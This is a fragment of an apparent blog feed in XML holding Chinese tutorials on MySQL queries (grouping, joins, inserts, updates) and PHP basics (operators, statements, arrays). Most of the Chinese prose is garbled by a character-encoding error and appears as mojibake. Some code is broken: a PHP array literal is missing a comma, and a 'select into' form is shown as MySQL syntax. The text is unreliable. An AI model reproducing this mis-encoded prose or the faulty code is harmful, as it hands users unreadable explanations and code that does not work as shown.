(æ³¨é‡Š:è¿™é‡Œçš„scoreæ˜¯åˆ—å)<span class="hljs-keyword">from</span> score (æ³¨é‡Š:è¿™é‡Œçš„scoreæ˜¯è¡¨å)<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> studentID//åœ¨è¡¨scoreä¸­æŸ¥è¯¢ï¼ŒæŒ‰strdentIDå­—æ®µåˆ†ç»„ï¼Œæ˜¾ç¤ºstrdentIDå­—æ®µå’Œscoreå­—æ®µçš„å¹³å‡å€¼ï¼›<span class="hljs-keyword">select</span>è¯­å¥ä¸­åªå…è®¸è¢«åˆ†ç»„çš„åˆ—å’Œä¸ºæ¯ä¸ªåˆ†ç»„è¿”å›çš„ä¸€ä¸ªå€¼çš„è¡¨è¾¾å¼ï¼Œä¾‹å¦‚ç”¨ä¸€ä¸ªåˆ—åä½œä¸ºå‚æ•°çš„èšåˆå‡½æ•°ä½¿ç”¨<span class="hljs-keyword">having</span>å­å¥è¿›è¡Œåˆ†ç»„ç­›é€‰<span class="hljs-keyword">select</span> studentID <span class="hljs-keyword">as</span> å­¦å‘˜ç¼–å·,AVG(score) <span class="hljs-keyword">as</span> å¹³å‡æˆç»© (æ³¨é‡Š:è¿™é‡Œçš„scoreæ˜¯åˆ—å)<span class="hljs-keyword">from</span> score (æ³¨é‡Š:è¿™é‡Œçš„scoreæ˜¯è¡¨å)<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> studentID<span class="hljs-keyword">having</span> count(score)&gt;<span class="hljs-number">1</span>//æ¥ä¸Šé¢ä¾‹å­ï¼Œæ˜¾ç¤ºåˆ†ç»„åcount(score)&gt;<span class="hljs-number">1</span>çš„è¡Œï¼Œç”±äº<span class="hljs-keyword">where</span>åªèƒ½åœ¨æ²¡æœ‰åˆ†ç»„æ—¶ä½¿ç”¨ï¼Œåˆ†ç»„ååªèƒ½ä½¿ç”¨<span class="hljs-keyword">having</span>æ¥é™åˆ¶æ¡ä»¶ã€‚<span class="hljs-number">11.</span>å¤šè¡¨è”æ¥æŸ¥è¯¢å†…è”æ¥ï¼šåœ¨<span class="hljs-keyword">where</span>å­å¥ä¸­æŒ‡å®šè”æ¥æ¡ä»¶<span class="hljs-keyword">select</span> a.name,b.chengji <span class="hljs-keyword">from</span> a,b <span class="hljs-keyword">where</span> a.name=b.name//æŸ¥è¯¢è¡¨aå’Œè¡¨bä¸­<span class="hljs-type">name</span>å­—æ®µç›¸ç­‰çš„è®°å½•ï¼Œå¹¶æ˜¾ç¤ºè¡¨aä¸­çš„<span class="hljs-type">name</span>å­—æ®µå’Œè¡¨bä¸­çš„chengjiå­—æ®µåœ¨<span class="hljs-keyword">from</span>å­å¥ä¸­ä½¿ç”¨<span class="hljs-keyword">join</span>â€¦<span class="hljs-keyword">on</span><span class="hljs-keyword">select</span> a.name,b.chengji <span class="hljs-keyword">from</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> b <span class="hljs-keyword">on</span> (a.name=b.name)å¤–è”æ¥ï¼šå·¦å¤–è”æ¥æŸ¥è¯¢<span class="hljs-keyword">select</span> s.name,c.courseID,c.score <span class="hljs-keyword">from</span> strdents <span class="hljs-keyword">as</span> s <span class="hljs-keyword">left outer join</span> score <span class="hljs-keyword">as</span> c<span class="hljs-keyword">on</span> s.scode=c.strdentID//åœ¨strdentsè¡¨å’Œscoreè¡¨ä¸­æŸ¥è¯¢æ»¡è¶³<span class="hljs-keyword">on</span>æ¡ä»¶çš„è¡Œï¼Œæ¡ä»¶ä¸ºscoreè¡¨çš„strdentIDä¸strdentsè¡¨ä¸­çš„scondeç›¸åŒå³å¤–è”æ¥æŸ¥è¯¢<span class="hljs-keyword">select</span> s.name,c.courseID,c.score <span class="hljs-keyword">from</span> strdents <span class="hljs-keyword">as</span> s <span class="hljs-keyword">right outer join</span> score <span class="hljs-keyword">as</span> c<span class="hljs-keyword">on</span> s.scode=c.strdentID//åœ¨strdentsè¡¨å’Œscoreè¡¨ä¸­æŸ¥è¯¢æ»¡è¶³<span class="hljs-keyword">on</span>æ¡ä»¶çš„è¡Œï¼Œæ¡ä»¶ä¸ºstrdentsè¡¨ä¸­çš„scondeä¸scoreè¡¨çš„strdentIDç›¸åŒ</code></pre><h4 id="ä½¿ç”¨PHPè„šæœ¬-v2"><a class="header-anchor" href="#ä½¿ç”¨PHPè„šæœ¬-v2">ğŸ­</a>ä½¿ç”¨PHPè„šæœ¬</h4><p>ä½¿ç”¨ <strong>mysqli_query()</strong> åŠ <strong>SQL SELECT</strong> å‘½ä»¤æ¥è·å–æ•°æ®ã€‚</p><p>é€šè¿‡  <strong>mysqli_fetch_array()</strong> æ¥ä½¿ç”¨æˆ–è¾“å‡ºæ‰€æœ‰æŸ¥è¯¢çš„æ•°æ®ï¼Œè¯¥å‡½æ•°ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ï¼Œæˆ–æ•°å­—æ•°ç»„ï¼Œæˆ–äºŒè€…å…¼æœ‰ è¿”å›æ ¹æ®ä»ç»“æœé›†å–å¾—çš„è¡Œç”Ÿæˆçš„æ•°ç»„ï¼Œå¦‚æœæ²¡æœ‰æ›´å¤šè¡Œåˆ™è¿”å› falseã€‚</p><h2 id="MySQL-æ’å…¥æ•°æ®"><a class="header-anchor" href="#MySQL-æ’å…¥æ•°æ®">ğŸ­</a>MySQL æ’å…¥æ•°æ®</h2><p>æ’å…¥å•è¡Œ</p><pre><code class="hljs lisp">INSERT INTO table_name ( <span class="hljs-name">field1</span>, field2,...fieldN )                       VALUES                       ( <span class="hljs-name">value1</span>, value2,...valueN )<span class="hljs-comment">;</span></code></pre><p>å°†ç°æœ‰è¡¨æ•°æ®æ·»åŠ åˆ°ä¸€ä¸ªå·²æœ‰è¡¨</p><pre><code class="hljs n1ql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> &lt;å·²æœ‰çš„æ–°è¡¨&gt; (åˆ—å) <span class="hljs-keyword">select</span> &lt;åŸè¡¨åˆ—å&gt; <span class="hljs-keyword">from</span> &lt;åŸè¡¨å&gt;</code></pre><p>ç›´æ¥æ‹¿ç°æœ‰è¡¨æ•°æ®åˆ›å»ºä¸€ä¸ªæ–°è¡¨å¹¶å¡«å……</p><pre><code class="hljs pf">select <span class="hljs-variable">&lt;æ–°å»ºè¡¨åˆ—å&gt;</span> into <span class="hljs-variable">&lt;æ–°å»ºè¡¨å&gt;</span> <span class="hljs-keyword">from</span> <span class="hljs-variable">&lt;æºè¡¨å&gt;</span></code></pre><h4 id="å‘½ä»¤æç¤ºçª—å£"><a class="header-anchor" href="#å‘½ä»¤æç¤ºçª—å£">ğŸ­</a>å‘½ä»¤æç¤ºçª—å£</h4><p>å®ä¾‹:</p><p>å¦‚æœæ•°æ®æ˜¯å­—ç¬¦å‹ï¼Œå¿…é¡»ä½¿ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·ï¼Œå¦‚ï¼šâ€œç¦å·â€ã€‚</p><pre><code class="hljs mipsasm">mysql&gt; <span class="hljs-keyword">INSERT </span>INTO <span class="hljs-keyword">blackpink_tbl </span>       (<span class="hljs-keyword">blackpink_title, </span><span class="hljs-keyword">blackpink_author, </span><span class="hljs-keyword">submission_date)</span><span class="hljs-keyword"> </span>      VALUES       (<span class="hljs-string">&quot;å¤§å­¦&quot;</span>, <span class="hljs-string">&quot;ç¦å·&quot;</span>, NOW());Query OK, <span class="hljs-number">1</span> rows affected, <span class="hljs-number">1</span> warnings (<span class="hljs-number">0</span>.<span class="hljs-number">01</span> sec)mysql&gt; <span class="hljs-keyword">INSERT </span>INTO <span class="hljs-keyword">blackpink_tbl</span><span class="hljs-keyword"> </span>      (<span class="hljs-keyword">blackpink_title, </span><span class="hljs-keyword">blackpink_author, </span><span class="hljs-keyword">submission_date)</span><span class="hljs-keyword"> </span>      VALUES       (<span class="hljs-string">&quot;ä¸­å­¦&quot;</span>, <span class="hljs-string">&quot;æ¼³å·&quot;</span>, <span class="hljs-string">&#x27;2014-09-01&#x27;</span>);Query OK, <span class="hljs-number">1</span> rows affected, <span class="hljs-number">1</span> warnings (<span class="hljs-number">0</span>.<span class="hljs-number">01</span> sec)mysql&gt; <span class="hljs-keyword">INSERT </span>INTO <span class="hljs-keyword">blackpink_tbl</span><span class="hljs-keyword"> </span>      (<span class="hljs-keyword">blackpink_title, </span><span class="hljs-keyword">blackpink_author, </span><span class="hljs-keyword">submission_date)</span><span class="hljs-keyword"> </span>      VALUES       (<span class="hljs-string">&quot;å°å­¦&quot;</span>, <span class="hljs-string">&quot;æ±Ÿéƒ½&quot;</span>, <span class="hljs-string">&#x27;2008-09-01&#x27;</span>);Query OK, <span class="hljs-number">1</span> rows affected (<span class="hljs-number">0</span>.<span class="hljs-number">00</span> sec)mysql&gt;</code></pre><p>è¯»å–æ•°æ®è¡¨ï¼šselect * from blackpink_tbl;</p><p>ç»“æœå¦‚ä¸‹ï¼š</p><pre><code class="hljs asciidoc"><span class="hljs-code">+--------------+</span>-----------------<span class="hljs-code">+------------------+</span>-----------------+| blackpink<span class="hljs-emphasis">_id | blackpink_</span>title | blackpink<span class="hljs-emphasis">_author | submission_</span>date |<span class="hljs-code">+--------------+</span>-----------------<span class="hljs-code">+------------------+</span>-----------------+|            1 | å¤§å­¦            | ç¦å·             | 2020-10-17      ||            2 | ä¸­å­¦            | æ¼³å·             | 2014-09-01      ||            3 | å°å­¦            | æ±Ÿéƒ½             | 2008-09-01      |<span class="hljs-code">+--------------+</span>-----------------<span class="hljs-code">+------------------+</span>-----------------+</code></pre><p>åŒæ ·ä¹Ÿå¯ä½¿ç”¨PHPè„šæœ¬æ’å…¥æ•°æ®ã€‚</p><h2 id="MySQLæ”¹æ•°æ®"><a class="header-anchor" href="#MySQLæ”¹æ•°æ®">ğŸ­</a>MySQLæ”¹æ•°æ®</h2><pre><code class="hljs pf">update <span class="hljs-variable">&lt;è¡¨å&gt;</span> <span class="hljs-built_in">set</span> <span class="hljs-variable">&lt;åˆ—å=æ›´æ–°å€¼&gt;</span> [where <span class="hljs-variable">&lt;æ›´æ–°æ¡ä»¶&gt;</span>]</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php(äºŒ)</title>
    <link href="/2020/10/14/php%20(%E4%BA%8C)/"/>
    <url>/2020/10/14/php%20(%E4%BA%8C)/</url>
    
    <content type="html"><![CDATA[<h1>php (äºŒ)</h1><ul><li><a href="#php-%E4%BA%8C">php (äºŒ)</a><ul><li><a href="#php-%E8%BF%90%E7%AE%97%E7%AC%A6">PHP è¿ç®—ç¬¦</a><ul><li><a href="#%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%AC%A6">ç®—æœ¯è¿ç®—ç¬¦:</a></li><li><a href="#%E9%80%92%E5%A2%9E%E9%80%92%E5%87%8F%E8%BF%90%E7%AE%97%E7%AC%A6">é€’å¢/é€’å‡è¿ç®—ç¬¦ï¼š</a></li><li><a href="#%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97%E7%AC%A6">æ¯”è¾ƒè¿ç®—ç¬¦ï¼š</a></li><li><a href="#%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6">é€»è¾‘è¿ç®—ç¬¦:</a></li><li><a href="#%E4%B8%89%E5%85%83%E8%BF%90%E7%AE%97%E7%AC%A6">ä¸‰å…ƒè¿ç®—ç¬¦:</a></li><li><a href="#%E7%BB%84%E5%90%88%E6%AF%94%E8%BE%83%E7%AC%A6php7">ç»„åˆæ¯”è¾ƒç¬¦(PHP7+):</a></li><li><a href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7">è¿ç®—ç¬¦ä¼˜å…ˆçº§:</a></li></ul></li><li><a href="#php%E8%AF%AD%E5%8F%A5">PHPè¯­å¥</a><ul><li><a href="#if-%E8%AF%AD%E5%8F%A5">if è¯­å¥ï¼š</a></li><li><a href="#php---ifelse-%E8%AF%AD%E5%8F%A5">PHP - ifâ€¦else è¯­å¥:</a></li><li><a href="#php---ifelseifelse-%E8%AF%AD%E5%8F%A5">PHP - ifâ€¦elseifâ€¦else è¯­å¥:</a></li><li><a href="#switch-%E8%AF%AD%E5%8F%A5">Switch è¯­å¥ï¼š</a></li></ul></li><li><a href="#php-%E6%95%B0%E7%BB%84array">PHP æ•°ç»„array()</a><ul><li><a href="#count-%E5%87%BD%E6%95%B0">count() å‡½æ•°:</a></li><li><a href="#php-%E6%95%B0%E5%80%BC%E6%95%B0%E7%BB%84">PHP æ•°å€¼æ•°ç»„ï¼š</a></li><li><a href="#%E9%81%8D%E5%8E%86%E6%95%B0%E5%80%BC%E6%95%B0%E7%BB%84">éå†æ•°å€¼æ•°ç»„:</a></li><li><a href="#%E5%85%B3%E8%81%94%E6%95%B0%E7%BB%84">å…³è”æ•°ç»„:</a></li></ul></li><li><a href="#php-%E6%95%B0%E7%BB%84%E6%8E%92%E5%BA%8F">PHP æ•°ç»„æ’åº</a></li><li><a href="#php-%E8%B6%85%E7%BA%A7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F">PHP è¶…çº§å…¨å±€å˜é‡</a><ul><li><a href="#globals">$GLOBALS</a></li><li><a href="#_server">$_SERVER</a></li><li><a href="#_request">$_REQUEST</a></li><li><a href="#_post">$_POST</a></li><li><a href="#_get">$_GET</a></li></ul></li><li><a href="#php-%E5%BE%AA%E7%8E%AF">PHP å¾ªç¯</a><ul><li><a href="#while">while</a></li><li><a href="#dowhile-%E8%AF%AD%E5%8F%A5">doâ€¦while è¯­å¥</a></li><li><a href="#for-%E5%BE%AA%E7%8E%AF">for å¾ªç¯</a></li><li><a href="#foreach-%E5%BE%AA%E7%8E%AF">foreach å¾ªç¯</a></li></ul></li><li><a href="#php-%E5%87%BD%E6%95%B0">PHP å‡½æ•°</a><ul><li><a href="#%E5%88%9B%E5%BB%BA-php-%E5%87%BD%E6%95%B0">åˆ›å»º PHP å‡½æ•°</a></li><li><a href="#php-%E5%87%BD%E6%95%B0---%E6%B7%BB%E5%8A%A0%E5%8F%82%E6%95%B0">PHP å‡½æ•° - æ·»åŠ å‚æ•°</a></li></ul></li><li><a href="#php-%E9%AD%94%E6%9C%AF%E5%B8%B8%E9%87%8F">PHP é­”æœ¯å¸¸é‡</a><ul><li><a href="#line"><strong>LINE</strong></a></li><li><a href="#file"><strong>FILE</strong></a></li><li><a href="#dir"><strong>DIR</strong></a></li><li><a href="#function"><strong>FUNCTION</strong></a></li><li><a href="#class"><strong>CLASS</strong></a></li><li><a href="#method"><strong>METHOD</strong></a></li><li><a href="#namespace"><strong>NAMESPACE</strong></a></li></ul></li></ul></li></ul><h2 id="PHP-è¿ç®—ç¬¦"><a class="header-anchor" href="#PHP-è¿ç®—ç¬¦">ğŸ­</a>PHP è¿ç®—ç¬¦</h2><h4 id="ç®—æœ¯è¿ç®—ç¬¦"><a class="header-anchor" href="#ç®—æœ¯è¿ç®—ç¬¦">ğŸ­</a>ç®—æœ¯è¿ç®—ç¬¦:</h4><table><thead><tr><th>x + y</th><th>x - y</th><th>x * y</th><th>x / y</th><th>x % y</th><th>- x</th><th style="text-align:center">a . b</th></tr></thead><tbody><tr><td>åŠ </td><td>å‡</td><td>ä¹˜</td><td>é™¤</td><td>æ¨¡ï¼ˆé™¤æ³•çš„ä½™æ•°ï¼‰</td><td>å–å</td><td style="text-align:center">å¹¶ç½®</td></tr></tbody></table><p>æ•´é™¤è¿ç®—ç¬¦ <strong>intdiv()</strong>ï¼Œè¯¥å‡½æ•°è¿”å›å€¼ä¸ºç¬¬ä¸€ä¸ªå‚æ•°é™¤äºç¬¬äºŒä¸ªå‚æ•°çš„å€¼å¹¶å–æ•´ï¼ˆå‘ä¸‹å–æ•´ï¼‰ã€‚</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>var_dump(intdiv(<span class="hljs-number">16</span>, <span class="hljs-number">5</span>));<span class="hljs-meta">?&gt;</span></code></pre><p>ç»“æœä¸º3</p><h4 id="é€’å¢-é€’å‡è¿ç®—ç¬¦ï¼š"><a class="header-anchor" href="#é€’å¢-é€’å‡è¿ç®—ç¬¦ï¼š">ğŸ­</a>é€’å¢/é€’å‡è¿ç®—ç¬¦ï¼š</h4><table><thead><tr><th style="text-align:left">è¿ç®—ç¬¦</th><th style="text-align:left">åç§°</th><th style="text-align:left">æè¿°</th></tr></thead><tbody><tr><td style="text-align:left">++ x</td><td style="text-align:left">é¢„é€’å¢</td><td style="text-align:left">x åŠ  1ï¼Œç„¶åè¿”å› x</td></tr><tr><td style="text-align:left">x ++</td><td style="text-align:left">åé€’å¢</td><td style="text-align:left">è¿”å› xï¼Œç„¶å x åŠ  1</td></tr><tr><td style="text-align:left">â€“ x</td><td style="text-align:left">é¢„é€’å‡</td><td style="text-align:left">x å‡ 1ï¼Œç„¶åè¿”å› x</td></tr><tr><td style="text-align:left">x â€“</td><td style="text-align:left">åé€’å‡</td><td style="text-align:left">è¿”å› xï¼Œç„¶å x å‡ 1</td></tr></tbody></table><h4 id="æ¯”è¾ƒè¿ç®—ç¬¦ï¼š"><a class="header-anchor" href="#æ¯”è¾ƒè¿ç®—ç¬¦ï¼š">ğŸ­</a>æ¯”è¾ƒè¿ç®—ç¬¦ï¼š</h4><table><thead><tr><th>x == y</th><th>x === y</th><th>x !== y</th><th>x&gt;y</th><th>x&lt;y</th><th>x&gt;=y</th><th>x&lt;=y</th><th>x != y,x &lt;&gt; y</th></tr></thead><tbody><tr><td>ç­‰äº</td><td>ç»å¯¹ç­‰äº</td><td>ç»å¯¹ä¸ç­‰äº</td><td>å¤§äº</td><td>å°äº</td><td>å¤§äºç­‰äº</td><td>å°äºç­‰äº</td><td>ä¸ç­‰äº</td></tr></tbody></table><h4 id="é€»è¾‘è¿ç®—ç¬¦"><a class="header-anchor" href="#é€»è¾‘è¿ç®—ç¬¦">ğŸ­</a>é€»è¾‘è¿ç®—ç¬¦:</h4><table><thead><tr><th style="text-align:center">andï¼Œ&amp;&amp;</th><th>or,||</th><th>xor</th><th>!x</th></tr></thead><tbody><tr><td style="text-align:center">ä¸</td><td>æˆ–</td><td>å¼‚æˆ–</td><td>é</td></tr></tbody></table><h4 id="ä¸‰å…ƒè¿ç®—ç¬¦"><a class="header-anchor" href="#ä¸‰å…ƒè¿ç®—ç¬¦">ğŸ­</a>ä¸‰å…ƒè¿ç®—ç¬¦:</h4><pre><code class="hljs gcode"><span class="hljs-comment">(expr1)</span> ? <span class="hljs-comment">(expr2)</span> : <span class="hljs-comment">(expr3)</span></code></pre><p>å¯¹ expr1 æ±‚å€¼ä¸º TRUE æ—¶çš„å€¼ä¸º expr2ï¼Œåœ¨ expr1 æ±‚å€¼ä¸º FALSE æ—¶çš„å€¼ä¸º expr3ã€‚</p><h4 id="ç»„åˆæ¯”è¾ƒç¬¦-PHP7"><a class="header-anchor" href="#ç»„åˆæ¯”è¾ƒç¬¦-PHP7">ğŸ­</a>ç»„åˆæ¯”è¾ƒç¬¦(PHP7+):</h4><p>ç»„åˆæ¯”è¾ƒç¬¦ï¼ˆcombined comparison operatorï¼‰ä¹Ÿç§°ä¸ºå¤ªç©ºèˆ¹æ“ä½œç¬¦ï¼Œç¬¦å·ä¸º <strong>&lt;=&gt;</strong>ã€‚ç»„åˆæ¯”è¾ƒè¿ç®—ç¬¦å¯ä»¥è½»æ¾å®ç°ä¸¤ä¸ªå˜é‡çš„æ¯”è¾ƒï¼Œä¹Ÿä¸ä»…é™äºæ•°å€¼ç±»æ•°æ®çš„æ¯”è¾ƒã€‚</p><pre><code class="hljs pf"><span class="hljs-variable">$c</span> = <span class="hljs-variable">$a</span> <span class="hljs-variable">&lt;=&gt;</span> <span class="hljs-variable">$b</span>;</code></pre><ul><li>å¦‚æœ <strong>$a &gt; $b</strong>, åˆ™ <strong>$c</strong> çš„å€¼ä¸º <strong>1</strong>ã€‚</li><li>å¦‚æœ <strong>$a == $b</strong>, åˆ™ <strong>$c</strong> çš„å€¼ä¸º <strong>0</strong>ã€‚</li><li>å¦‚æœ <strong>$a &lt; $b</strong>, åˆ™ <strong>$c</strong> çš„å€¼ä¸º <strong>-1</strong>ã€‚</li></ul><h4 id="è¿ç®—ç¬¦ä¼˜å…ˆçº§"><a class="header-anchor" href="#è¿ç®—ç¬¦ä¼˜å…ˆçº§">ğŸ­</a>è¿ç®—ç¬¦ä¼˜å…ˆçº§:</h4><p>è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§å£è¯€ï¼šæ‹¬ï¼ˆå·ï¼‰ã€å•ï¼ˆæ“ä½œæ•°ï¼‰ã€ç®—ï¼ˆæœ¯ï¼‰ã€ç§»ï¼ˆä½ï¼‰ã€å…³ï¼ˆç³»ï¼‰ï¼›ä½ï¼ˆè¿ç®—ç¬¦ï¼‰ã€é€»ï¼ˆè¾‘ï¼‰ã€æ¡ï¼ˆä»¶ï¼‰ã€èµ‹ï¼ˆå€¼ï¼‰ã€é€—ï¼ˆå·ï¼‰ã€‚or å’Œ ||ï¼Œ&amp;&amp; å’Œ and éƒ½æ˜¯é€»è¾‘è¿ç®—ç¬¦ï¼Œæ•ˆæœä¸€æ ·ï¼Œä½†æ˜¯å…¶ä¼˜å…ˆçº§å´ä¸ä¸€æ ·ã€‚æˆ‘ä»¬<strong>é€šè¿‡æ‹¬å·çš„é…å¯¹æ¥æ˜ç¡®æ ‡æ˜è¿ç®—é¡ºåºï¼Œè€Œéé è¿ç®—ç¬¦ä¼˜å…ˆçº§å’Œç»“åˆæ€§æ¥å†³å®šï¼Œé€šå¸¸èƒ½å¤Ÿå¢åŠ ä»£ç çš„å¯è¯»æ€§ã€‚</strong></p><h2 id="PHPè¯­å¥"><a class="header-anchor" href="#PHPè¯­å¥">ğŸ­</a>PHPè¯­å¥</h2><h4 id="if-è¯­å¥ï¼š"><a class="header-anchor" href="#if-è¯­å¥ï¼š">ğŸ­</a>if è¯­å¥ï¼š</h4><p>if è¯­å¥ç”¨äº<strong>ä»…å½“æŒ‡å®šæ¡ä»¶æˆç«‹æ—¶æ‰§è¡Œä»£ç </strong>ã€‚</p><h4 id="PHP-ifâ€¦else-è¯­å¥"><a class="header-anchor" href="#PHP-ifâ€¦else-è¯­å¥">ğŸ­</a>PHP - ifâ€¦else è¯­å¥:</h4><p>åœ¨æ¡ä»¶æˆç«‹æ—¶æ‰§è¡Œä¸€å—ä»£ç ï¼Œæ¡ä»¶ä¸æˆç«‹æ—¶æ‰§è¡Œå¦ä¸€å—ä»£ç ã€‚</p><h4 id="PHP-ifâ€¦elseifâ€¦else-è¯­å¥"><a class="header-anchor" href="#PHP-ifâ€¦elseifâ€¦else-è¯­å¥">ğŸ­</a>PHP - ifâ€¦elseifâ€¦else è¯­å¥:</h4><p>åœ¨è‹¥å¹²æ¡ä»¶ä¹‹ä¸€æˆç«‹æ—¶æ‰§è¡Œä¸€ä¸ªä»£ç å—ã€‚</p><h4 id="Switch-è¯­å¥ï¼š"><a class="header-anchor" href="#Switch-è¯­å¥ï¼š">ğŸ­</a>Switch è¯­å¥ï¼š</h4><p>switch è¯­å¥ç”¨äºæ ¹æ®å¤šä¸ªä¸åŒæ¡ä»¶æ‰§è¡Œä¸åŒåŠ¨ä½œï¼Œæœ‰é€‰æ‹©åœ°æ‰§è¡Œè‹¥å¹²ä»£ç å—ä¹‹ä¸€ã€‚</p><p>å·¥ä½œåŸç†ï¼šé¦–å…ˆå¯¹ä¸€ä¸ªç®€å•çš„è¡¨è¾¾å¼ <em>n</em>ï¼ˆé€šå¸¸æ˜¯å˜é‡ï¼‰è¿›è¡Œä¸€æ¬¡è®¡ç®—ã€‚å°†è¡¨è¾¾å¼çš„å€¼ä¸ç»“æ„ä¸­æ¯ä¸ª case çš„å€¼è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœå­˜åœ¨åŒ¹é…ï¼Œåˆ™æ‰§è¡Œä¸ case å…³è”çš„ä»£ç ã€‚ä»£ç æ‰§è¡Œåï¼Œä½¿ç”¨ <strong>break</strong> æ¥é˜»æ­¢ä»£ç è·³å…¥ä¸‹ä¸€ä¸ª case ä¸­ç»§ç»­æ‰§è¡Œã€‚<strong>default</strong> è¯­å¥ç”¨äºä¸å­˜åœ¨åŒ¹é…ï¼ˆå³æ²¡æœ‰ case ä¸ºçœŸï¼‰æ—¶æ‰§è¡Œã€‚</p><h2 id="PHP-æ•°ç»„array"><a class="header-anchor" href="#PHP-æ•°ç»„array">ğŸ­</a>PHP æ•°ç»„array()</h2><p>æ•°ç»„æ˜¯ä¸€ä¸ªèƒ½åœ¨å•ä¸ªå˜é‡ä¸­å­˜å‚¨å¤šä¸ªå€¼çš„ç‰¹æ®Šå˜é‡ã€‚</p><ul><li><strong>æ•°å€¼æ•°ç»„</strong> - å¸¦æœ‰æ•°å­— ID é”®çš„æ•°ç»„</li><li><strong>å…³è”æ•°ç»„</strong> - å¸¦æœ‰æŒ‡å®šçš„é”®çš„æ•°ç»„ï¼Œæ¯ä¸ªé”®å…³è”ä¸€ä¸ªå€¼</li><li><strong>å¤šç»´æ•°ç»„</strong> - åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæ•°ç»„çš„æ•°ç»„</li></ul><h4 id="count-å‡½æ•°"><a class="header-anchor" href="#count-å‡½æ•°">ğŸ­</a>count() å‡½æ•°:</h4><p>count() å‡½æ•°ç”¨äºè¿”å›æ•°ç»„çš„é•¿åº¦ï¼ˆå…ƒç´ çš„æ•°é‡)ã€‚</p><h4 id="PHP-æ•°å€¼æ•°ç»„ï¼š"><a class="header-anchor" href="#PHP-æ•°å€¼æ•°ç»„ï¼š">ğŸ­</a>PHP æ•°å€¼æ•°ç»„ï¼š</h4><p>è¿™é‡Œæœ‰ä¸¤ç§åˆ›å»ºæ•°å€¼æ•°ç»„çš„æ–¹æ³•ï¼š</p><p>è‡ªåŠ¨åˆ†é… ID é”®ï¼ˆID é”®æ€»æ˜¯ä» 0 å¼€å§‹ï¼‰</p><pre><code class="hljs lasso">$cars=<span class="hljs-built_in">array</span>(<span class="hljs-string">&quot;rose&quot;</span>,<span class="hljs-string">&quot;lisa&quot;</span>,<span class="hljs-string">&quot;jennie&quot;</span><span class="hljs-string">&quot;jisoo&quot;</span>);</code></pre><p>äººå·¥åˆ†é… ID é”®ï¼š</p><pre><code class="hljs arcade"><span class="hljs-symbol">$cars</span>[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;rose&quot;</span>;<span class="hljs-symbol">$cars</span>[<span class="hljs-number">1</span>]=<span class="hljs-string">&quot;lisa&quot;</span>;<span class="hljs-symbol">$cars</span>[<span class="hljs-number">2</span>]=<span class="hljs-string">&quot;jennie&quot;</span>;<span class="hljs-symbol">$cars</span>[<span class="hljs-number">3</span>]=<span class="hljs-string">&quot;jisoo&quot;</span>;</code></pre><h4 id="éå†æ•°å€¼æ•°ç»„"><a class="header-anchor" href="#éå†æ•°å€¼æ•°ç»„">ğŸ­</a>éå†æ•°å€¼æ•°ç»„:</h4><p>éå†å¹¶æ‰“å°æ•°å€¼æ•°ç»„ä¸­çš„æ‰€æœ‰å€¼ï¼Œå¯ä»¥ä½¿ç”¨ for å¾ªç¯ã€‚</p><h4 id="å…³è”æ•°ç»„"><a class="header-anchor" href="#å…³è”æ•°ç»„">ğŸ­</a>å…³è”æ•°ç»„:</h4><p>ä½¿ç”¨åˆ†é…ç»™æ•°ç»„çš„æŒ‡å®šçš„é”®çš„æ•°ç»„ã€‚</p><p>æ³•ä¸€:</p><pre><code class="hljs php">$age=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Jane&quot;</span>=&gt;<span class="hljs-string">&quot;35&quot;</span>,<span class="hljs-string">&quot;Ben&quot;</span>=&gt;<span class="hljs-string">&quot;37&quot;</span>,<span class="hljs-string">&quot;Joe&quot;</span>=&gt;<span class="hljs-string">&quot;43&quot;</span>);</code></pre><p>æ³•äºŒï¼š</p><pre><code class="hljs arcade"><span class="hljs-symbol">$age</span>[<span class="hljs-string">&#x27;Jane&#x27;</span>]=<span class="hljs-string">&quot;35&quot;</span>;<span class="hljs-symbol">$age</span>[<span class="hljs-string">&#x27;Ben&#x27;</span>]=<span class="hljs-string">&quot;37&quot;</span>;<span class="hljs-symbol">$age</span>[<span class="hljs-string">&#x27;Joe&#x27;</span>]=<span class="hljs-string">&quot;43&quot;</span>;</code></pre><h2 id="PHP-æ•°ç»„æ’åº"><a class="header-anchor" href="#PHP-æ•°ç»„æ’åº">ğŸ­</a>PHP æ•°ç»„æ’åº</h2><p>æ•°ç»„ä¸­çš„å…ƒç´ å¯ä»¥æŒ‰å­—æ¯æˆ–æ•°å­—é¡ºåºè¿›è¡Œé™åºæˆ–å‡åºæ’åˆ—ã€‚</p><ul><li>sort() - å¯¹æ•°ç»„è¿›è¡Œå‡åºæ’åˆ—</li><li>rsort() - å¯¹æ•°ç»„è¿›è¡Œé™åºæ’åˆ—</li><li>asort() - æ ¹æ®æ•°ç»„çš„å€¼ï¼Œå¯¹æ•°ç»„è¿›è¡Œå‡åºæ’åˆ—</li><li>ksort() - æ ¹æ®æ•°ç»„çš„é”®ï¼Œå¯¹æ•°ç»„è¿›è¡Œå‡åºæ’åˆ—</li></ul><h2 id="PHP-è¶…çº§å…¨å±€å˜é‡"><a class="header-anchor" href="#PHP-è¶…çº§å…¨å±€å˜é‡">ğŸ­</a>PHP è¶…çº§å…¨å±€å˜é‡</h2><p>è¶…çº§å˜é‡åœ¨å…¨éƒ¨ä½œç”¨åŸŸä¸­éƒ½å¯ç”¨ï¼Œä¸éœ€è¦ç‰¹åˆ«è¯´æ˜ã€‚</p><h4 id="GLOBALS"><a class="header-anchor" 